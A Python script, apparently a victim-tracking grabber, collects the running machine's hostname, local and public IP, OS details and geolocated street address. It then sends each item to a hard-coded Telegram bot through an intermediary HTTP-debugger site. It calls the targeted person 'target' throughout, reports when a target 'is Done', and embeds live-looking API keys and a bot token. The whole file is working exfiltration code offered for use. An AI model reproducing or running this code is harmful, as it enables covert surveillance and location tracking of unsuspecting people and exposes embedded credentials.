import requests
import socket
import json
import time
import platform as pt
from colorama import *


host = socket.gethostname()
local_ip = socket.gethostbyname(host)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target local ip :  "+Fore.RED+local_ip)

public = requests.get("https://api.ipify.org/").text
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target public ip :  "+Fore.RED+public)

local_info = pt.uname()
local_dic = {local_info}

for x in local_dic:
    os = x[0]
    system_name = x[1]
    os_version = x[3]

print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target os version :  "+Fore.RED+os_version)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target system name :  "+Fore.RED+system_name)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target os :  "+Fore.RED+os)

req_info = requests.get('https://api.ipgeolocation.io/ipgeo?apiKey=41dd172324e3471c94e50b2a5e945759&ip='+public+'&fields=geo')
json = req_info.json()


lat = json['latitude']
lon = json['longitude']
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target latitude :  "+Fore.RED+lat)
time.sleep(1.5)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target longitude :  "+Fore.RED+lon)
Fore.WHITE

api_key = {
    "Api-Key": "service.dc3cfbffc5d84ac38ed07f24a3f7da19"
}

url_add = "https://api.neshan.org/v5/reverse?lat="+lat+"&lng="+lon
req_addres = requests.get(url_add,headers=api_key)
adders_info = req_addres.json()

city = adders_info['city']
state = adders_info['state']
addres = adders_info['formatted_address']
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target state :  "+Fore.RED+state)
time.sleep(1.5)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target city :  "+Fore.RED+city)
time.sleep(1.5)
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"target accurate adders :  "+Fore.RED+addres)

 #.........after bot in the url_telegram add your telegram token and after chat id add your chat id.........#
url_telegram = "https://api.telegram.org/bot6805319274:AAFZ3HlD6teXXfIy0nJOXGcbQKbeUxMRPqU/sendmessage?chat_id=6343848352&text="
url_intermediary = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

url_telegarm_id= url_telegram+"target id  :  "+system_name
url_telegarm_local_ip= url_telegram+"target local ip :  "+local_ip
url_telegarm_public_ip= url_telegram+"target public ip :  "+public
url_telegarm_os= url_telegram+"target os :  "+system_name
url_telegarm_os_vertion= url_telegram+"target os verstion :  "+os_version
url_telegarm_lat= url_telegram+"target latitude :  "+lat
url_telegarm_lon= url_telegram+"target longitude :  "+lon
url_telegarm_state= url_telegram+"target state :   "+state
url_telegarm_city= url_telegram+"target city :  "+city
url_telegarm_adders= url_telegram+"target accurate adders :  "+addres
url_telegarm_done= url_telegram+"this target"+"("+system_name+")"+"is Done"

payload_id = {
"UrlBox":url_telegarm_id,
"VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_local_ip = {
    "UrlBox":url_telegarm_local_ip,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_public_ip = {
    "UrlBox":url_telegarm_public_ip,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_os = {
    "UrlBox":url_telegarm_os,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_os_vertion = {
    "UrlBox":url_telegarm_os_vertion,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_lat = {
    "UrlBox":url_telegarm_lat,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_lon = {
    "UrlBox":url_telegarm_lon,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_state = {
    "UrlBox":url_telegarm_state,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_city = {
    "UrlBox":url_telegarm_city,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_adders = {
    "UrlBox":url_telegarm_adders,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }

payload_aders_done = {
    "UrlBox":url_telegarm_done,
    "VersionsList":"HTTP/1.1",
    "MethodList":"POST"
    }
print(Fore.GREEN+"[+]"+Fore.LIGHTBLUE_EX+"send telegram status :  ")

req_telegram_id = requests.post(url_intermediary,payload_id)
req_telegram_local_ip= requests.post(url_intermediary,payload_local_ip)
req_telegram_public_ip = requests.post(url_intermediary,payload_public_ip)
req_telegram_os= requests.post(url_intermediary,payload_os)
req_telegram_os_vertion = requests.post(url_intermediary,payload_os_vertion)
req_telegram_lat = requests.post(url_intermediary,payload_lat)
req_telegram_lon = requests.post(url_intermediary,payload_lon)
req_telegram_state = requests.post(url_intermediary,payload_state)
req_telegram_city = requests.post(url_intermediary,payload_city)
req_telegram_adders = requests.post(url_intermediary,payload_adders)
req_telegram_done = requests.post(url_intermediary,payload_aders_done)

if req_telegram_done.status_code == 200 :
    print(Fore.GREEN)
    print(req_telegram_adders.json)
    print(Fore.WHITE)
else:
    print(Fore.RED)
    print(req_telegram_done.json)
    print(Fore.WHITE)
